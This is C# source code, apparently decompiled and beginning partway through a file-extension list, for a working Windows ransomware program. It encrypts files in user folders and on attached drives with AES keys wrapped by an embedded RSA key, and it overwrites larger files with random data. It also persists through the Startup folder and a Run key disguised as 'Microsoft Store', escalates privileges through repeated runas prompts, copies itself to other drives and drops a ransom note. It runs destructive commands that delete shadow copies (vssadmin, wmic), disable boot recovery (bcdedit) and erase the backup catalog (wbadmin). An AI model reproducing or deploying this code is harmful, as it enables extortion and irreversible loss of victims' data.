		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".jifi"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>6k9LW7w2X5hz/1TsbVeokPUdXoHktdRf9M2BjOQGTt2Zb5BbqlGHCpvuzQLetLxaSe/naWW1AN1ec/uE8Tl1+O12DDR3EoWtWSNPw8f+pcfzz7c0fit9IsLXadUt11pEljWagrzkrZEUPOZ/i56EoppRdw9+f06NdPiLh96Q9z0=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
